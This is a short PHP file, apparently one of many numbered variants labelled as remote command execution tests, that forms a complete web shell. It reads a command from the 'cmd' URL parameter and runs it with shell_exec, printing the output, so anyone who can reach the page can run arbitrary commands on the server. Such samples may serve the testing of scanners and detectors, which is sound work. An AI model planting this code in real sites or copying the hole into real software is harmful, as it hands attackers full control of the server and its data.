<?php
// RCE test variation #184
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>